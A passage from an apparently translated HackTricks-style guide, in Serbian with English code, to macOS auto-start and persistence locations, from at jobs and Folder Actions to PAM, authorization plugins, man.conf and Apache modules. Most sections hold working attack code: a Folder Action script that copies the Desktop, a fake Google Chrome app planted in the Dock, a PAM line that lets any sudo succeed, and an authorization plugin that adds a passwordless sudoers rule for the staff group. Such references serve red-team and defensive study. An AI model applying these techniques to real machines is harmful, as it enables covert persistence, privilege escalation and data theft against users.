SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Ako AT zadaci nisu omogućeni, kreirani zadaci neće biti izvršeni.

The **job files** se nalaze u `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Ime fajla sadrži red, broj posla i vreme kada je zakazano izvršavanje. Na primer, pogledajmo `a0001a019bdcd2`.

- `a` - ovo je red
- `0001a` - broj posla u hex-u, `0x1a = 26`
- `019bdcd2` - vreme u hex-u. Predstavlja minute koje su prošle od epoch-a. `0x019bdcd2` je `26991826` u decimalnom obliku. Ako ga pomnožimo sa 60 dobijamo `1619509560`, što je `GMT: 2021. April 27., Tuesday 7:46:00`.

Ako ispišemo fajl posla, nalazimo da sadrži iste informacije koje dobijemo pomoću `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali morate moći da pozovete `osascript` sa argumentima da biste kontaktirali **`System Events`** i konfigurisali Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ima neka osnovna TCC dopuštenja kao što su Desktop, Documents i Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Zahteva root
- **Trigger**: Pristup navedenom folderu
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Pristup navedenom folderu

#### Description & Exploitation

Folder Actions su skripte koje se automatski pokreću pri promenama u folderu, kao što su dodavanje ili uklanjanje stavki, ili druge radnje poput otvaranja ili promene veličine prozora foldera. Ove radnje se mogu iskoristiti za razne zadatke i mogu se aktivirati na različite načine, npr. preko Finder UI-a ili terminal komandi.

Za podešavanje Folder Actions imate opcije kao što su:

1. Kreiranje Folder Action workflow-a pomoću [Automator](https://support.apple.com/guide/automator/welcome/mac) i instaliranje kao service.
2. Prikačivanje skripte ručno putem Folder Actions Setup u kontekst meniju foldera.
3. Korišćenje OSAScript za slanje Apple Event poruka `System Events.app` radi programskog podešavanja Folder Action.
- Ova metoda je posebno korisna za ugradnju akcije u sistem, pružajući nivo perzistencije.

The following script is an example of what can be executed by a Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Da bi gornji script bio upotrebljiv sa Folder Actions, kompajlirajte ga koristeći:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nakon što je skripta kompajlirana, podesite Folder Actions izvršavanjem skripte ispod. Ova skripta će omogućiti Folder Actions globalno i posebno prikačiti prethodno kompajliranu skriptu na Desktop folder.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Pokrenite skriptu za podešavanje pomoću:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Ovo je način za implementaciju ove persistence putem GUI:

Ovo je skripta koja će biti izvršena:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompajlirajte ga pomoću: `osacompile -l JavaScript -o folder.scpt source.js`

Premestite ga u:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Then, open the `Folder Actions Setup` app, select the **folder koji želite da pratite** and select in your case **`folder.scpt`** (u mom slučaju sam ga nazvao output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sada, ako otvorite taj folder pomoću Finder-a, vaš skript će se izvršiti.

Ova konfiguracija je sačuvana u **plist** located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.

Sada, pokušajmo da pripremimo ovu persistence bez pristupa GUI-ju:

1. **Kopirajte `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u `/tmp` da biste napravili backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Uklonite** Folder Actions koje ste upravo podesili:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sada kada imamo prazno okruženje

3. Kopirajte backup fajl: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otvorite Folder Actions Setup.app da biste učitali ovu konfiguraciju: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> I ovo nije radilo kod mene, ali ovo su instrukcije iz writeup-a:(

### Dock prečice

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali morate imati instaliranu zlonamernu aplikaciju u sistemu
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `~/Library/Preferences/com.apple.dock.plist`
- **Okidač**: Kada korisnik klikne na aplikaciju u Dock-u

#### Opis i eksploatacija

Sve aplikacije koje se pojavljuju u Dock-u su navedene u plist-u: **`~/Library/Preferences/com.apple.dock.plist`**

Moguće je **dodati aplikaciju** samo sa:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Korišćenjem neke **social engineering** taktike možete, na primer, **imitirati Google Chrome** u docku i zapravo izvršiti svoj script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Korisno za bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Potrebna je veoma specifična akcija
- Završićete u drugom sandboxu
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/Library/ColorPickers`
- Zahteva root
- Okidač: Upotrebite color picker
- `~/Library/ColorPickers`
- Okidač: Upotrebite color picker

#### Opis & Exploit

**Kompajlirajte color picker** bundle sa vašim kodom (možete koristiti [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) i dodajte konstruktor (kao u [Screen Saver section](macos-auto-start-locations.md#screen-saver)) i kopirajte bundle u `~/Library/ColorPickers`.

Zatim, kada se color picker pokrene, vaš kod bi trebao biti pokrenut.

Imajte na umu da binarni fajl koji učitava vašu biblioteku ima **veoma restriktivan sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Useful to bypass sandbox: **Ne, zato što morate da pokrenete sopstvenu aplikaciju**
- TCC bypass: ???

#### Lokacija

- Specifična aplikacija

#### Opis & Exploit

An application example with a Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).

Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **must be signed** with some valid Apple developer certificate, it must be **sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Analiza: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Analiza: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Koristan za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali ćete završiti u uobičajenom aplikacionom sandbox-u
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/System/Library/Screen Savers`
- Root required
- **Okidač**: Odaberite Screen Saver
- `/Library/Screen Savers`
- Root required
- **Okidač**: Odaberite Screen Saver
- `~/Library/Screen Savers`
- **Okidač**: Odaberite Screen Saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis & Exploit

Kreirajte novi projekat u Xcode i izaberite šablon za generisanje novog **Screen Saver**. Zatim dodajte svoj kod u njega, na primer sledeći kod za generisanje logova.

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Zatim otvorite GUI za Screen Saver i ako samo kliknete na njega, trebalo bi da generiše mnogo logova:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Obratite pažnju da, pošto u entitlements-ima binarnog fajla koji učitava ovaj kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) možete pronaći **`com.apple.security.app-sandbox`**, bićete **unutar uobičajenog aplikacionog sandbox-a**.
>
> Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali ćete završiti u sandboxu aplikacije
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox izgleda veoma ograničeno

#### Lokacija

- `~/Library/Spotlight/`
- **Okidač**: Nova datoteka sa ekstenzijom kojom upravlja Spotlight plugin je kreirana.
- `/Library/Spotlight/`
- **Okidač**: Nova datoteka sa ekstenzijom kojom upravlja Spotlight plugin je kreirana.
- Potrebne root privilegije
- `/System/Library/Spotlight/`
- **Okidač**: Nova datoteka sa ekstenzijom kojom upravlja Spotlight plugin je kreirana.
- Potrebne root privilegije
- `Some.app/Contents/Library/Spotlight/`
- **Okidač**: Nova datoteka sa ekstenzijom kojom upravlja Spotlight plugin je kreirana.
- Potrebna nova aplikacija

#### Opis i eksploatacija

Spotlight je ugrađena macOS funkcija za pretragu, dizajnirana da korisnicima obezbedi **brz i sveobuhvatan pristup podacima na njihovim računarima**.\
Da bi omogućio ovu brzu pretragu, Spotlight održava **vlasničku bazu podataka** i kreira indeks **parsiranjem većine fajlova**, dozvoljavajući brze pretrage kroz imena fajlova i njihov sadržaj.

Osnovni mehanizam Spotlight-a uključuje centralni proces nazvan 'mds', koji označava **'server metapodataka'**. Ovaj proces orkestrira čitavu Spotlight uslugu. Pored njega, postoji više demona 'mdworker' koji obavljaju razne održavajuće zadatke, kao što je indeksiranje različitih tipova fajlova (`ps -ef | grep mdworker`). Ovi zadaci su mogući zahvaljujući Spotlight importer pluginima, odnosno **".mdimporter bundles"**, koji omogućavaju Spotlight-u da razume i indeksira sadržaj u okviru raznovrsnih formata fajlova.

Pluginovi ili **`.mdimporter`** bundle-ovi se nalaze na lokacijama pomenutim ranije i ukoliko se pojavi novi bundle, on se učitava u roku od nekoliko minuta (nije potrebno restartovati nijednu uslugu). Ovi bundle-ovi moraju naznačiti koji **tip fajla i ekstenzije mogu da obrade**, na taj način Spotlight će ih koristiti kada se kreira nova datoteka sa označenom ekstenzijom.

Moguće je **pronaći sve `mdimporters`** koji su učitani pokretanjem:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
I na primer, **/Library/Spotlight/iBooksAuthor.mdimporter** se koristi za parsiranje ovakvih datoteka (ekstenzije `.iba` i `.book`, između ostalog):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Ako proverite Plist drugih `mdimporter` možda nećete pronaći unos **`UTTypeConformsTo`**. To je zato što je to ugrađeni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i ne mora da navodi ekstenzije.
>
> Štaviše, sistemski podrazumevani pluginovi uvek imaju prioritet, tako da napadač može pristupiti samo fajlovima koji nisu inače indeksirani od strane Apple-ovih `mdimporters`.

To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.

Na kraju izgradite i kopirajte vaš novi `.mdimporter` u jednu od prethodnih lokacija i možete proveriti kada je učitan **praćenjem logova** ili proverom **`mdimport -L.`**

### ~~Panel preferencija~~

> [!CAUTION]
> Čini se da ovo više ne radi.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Zahteva specifičnu radnju korisnika
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Čini se da ovo više ne radi.

## Root Sandbox Bypass

> [!TIP]
> Ovde možete naći start lokacije korisne za **sandbox bypass** koje vam omogućavaju jednostavno izvršavanje nečega pisanjem u fajl dok ste **root** i/ili zahtevajući druge **čudne uslove.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali potrebno je da budete root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Zahteva root
- **Okidač**: Kada dođe vreme
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Zahteva root
- **Okidač**: Kada dođe vreme

#### Opis & Eksploatacija

Periodični skripti (**`/etc/periodic`**) se izvršavaju zbog **launch daemons** konfigurisanih u `/System/Library/LaunchDaemons/com.apple.periodic*`. Imajte na umu da se skripti smeštene u `/etc/periodic/` **izvršavaju** kao **vlasnik fajla,** tako da ovo neće raditi za potencijalno eskaliranje privilegija.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Postoje i drugi periodični skripti koji će se izvršavati, navedeni u **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ako uspete da upišete bilo koji od fajlova `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local` on će biti **izvršen pre ili kasnije**.

> [!WARNING]
> Imajte na umu da će periodični skript biti **izvršen kao vlasnik skripta**. Dakle, ako običan korisnik poseduje skript, on će biti izvršen kao taj korisnik (ovo može sprečiti napade za eskalaciju privilegija).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali morate biti root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Uvek je potreban root

#### Description & Exploitation

Pošto je PAM više fokusiran na **persistence** i malware nego na lako izvršavanje unutar macOS-a, ovaj tekst neće davati detaljno objašnjenje — **pročitajte writeup-ove da biste bolje razumeli ovu tehniku**.

Proverite PAM module pomoću:
```bash
ls -l /etc/pam.d
```
Jedna persistence/privilege escalation tehnika koja zloupotrebljava PAM je jednostavna kao izmena modula /etc/pam.d/sudo dodavanjem na početak sledeće linije:
```bash
auth       sufficient     pam_permit.so
```
Dakle, to će **izgledati ovako**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Zbog toga će svaki pokušaj korišćenja **`sudo` uspeti**.

> [!CAUTION]
> Imajte na umu da je ovaj direktorijum zaštićen TCC-om, pa je vrlo verovatno da će korisnik dobiti prompt koji traži pristup.

Još jedan dobar primer je su, gde možete videti da je takođe moguće proslediti parametre PAM modulima (and you could also backdoor this file):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Korisno za bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ali morate biti root i napraviti dodatne konfiguracije
- TCC bypass: ???

#### Lokacija

- `/Library/Security/SecurityAgentPlugins/`
- Potrebne su root privilegije
- Takođe je potrebno konfigurisati authorization database da koristi plugin

#### Opis & Exploitation

Možete kreirati authorization plugin koji će se izvršiti kada se korisnik log-inuje da biste održali persistence. Za više informacija o tome kako napraviti jedan od ovih plugina pogledajte prethodne writeup-ove (i budite oprezni — loše napisan plugin može vas zaključati i moraćete očistiti svoj Mac iz recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Premestite** bundle na lokaciju sa koje će biti učitan:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Na kraju dodajte **pravilo** да се овај Plugin учита:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** obaveštava okvir za autorizaciju da treba da **pozove eksterni mehanizam za autorizaciju**. Pored toga, **`privileged`** će omogućiti izvršavanje kao root.

Pokrenite ga sa:
```bash
security authorize com.asdf.asdf
```
I onda **grupa staff treba da ima sudo** pristup (pročitajte `/etc/sudoers` da potvrdite).

### Man.conf

Analiza: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Koristan za bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ali morate biti root i korisnik mora da koristi man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/private/etc/man.conf`**
- Zahteva root privilegije
- **`/private/etc/man.conf`**: Kad god se koristi man

#### Opis & Exploit

Konfiguracioni fajl **`/private/etc/man.conf`** određuje binary/script koji se koristi kada se otvaraju man dokumentacije. Dakle, putanja do executable može biti izmenjena tako da svaki put kada korisnik koristi man da pročita neku dokumentaciju, backdoor bude izvršen.

Na primer postavite u **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
A zatim kreirajte `/tmp/view` kao:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Izveštaj**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Korisno za bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ali je potrebno biti root i apache mora biti pokrenut
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd nema entitlements

#### Lokacija

- **`/etc/apache2/httpd.conf`**
- Potreban root
- Okidač: Kada je Apache2 pokrenut

#### Opis & Exploit

U `/etc/apache2/httpd.conf` možete navesti da se učita modul dodavanjem linije kao što je:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Na ovaj način će vaš kompajlirani modul biti učitan od strane Apache. Jedino što je potrebno je ili da ga **potpišete važećim Apple sertifikatom**, ili da **dodate novi pouzdani sertifikat** u sistem i **potpišete ga** tim sertifikatom.

Zatim, ako je potrebno, da biste bili sigurni da će server biti pokrenut, možete izvršiti:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Primer koda za Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Korisno za bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Međutim, morate biti root, auditd mora biti pokrenut i morate izazvati upozorenje
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/etc/security/audit_warn`**
- Zahteva se root
- **Okidač**: Kada auditd otkrije upozorenje

#### Opis & Exploit

Kad god auditd otkrije upozorenje, skripta **`/etc/security/audit_warn`** se **izvršava**. Dakle, možete dodati svoj payload u nju.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Možete izazvati upozorenje sa `sudo audit -n`.

### Stavke za pokretanje

> [!CAUTION] > **Ovo je zastarelo, pa u tim direktorijumima ne bi trebalo ništa da se nalazi.**

Direktorijum **StartupItem** treba da se nalazi unutar `/Library/StartupItems/` ili `/System/Library/StartupItems/`. Kada je ovaj direktorijum uspostavljen, on mora da obuhvati dve specifične datoteke:

1. An **rc script**: shell skripta koja se izvršava pri pokretanju.
2. A **plist file**, konkretno `StartupParameters.plist`, koja sadrži razne konfiguracione postavke.

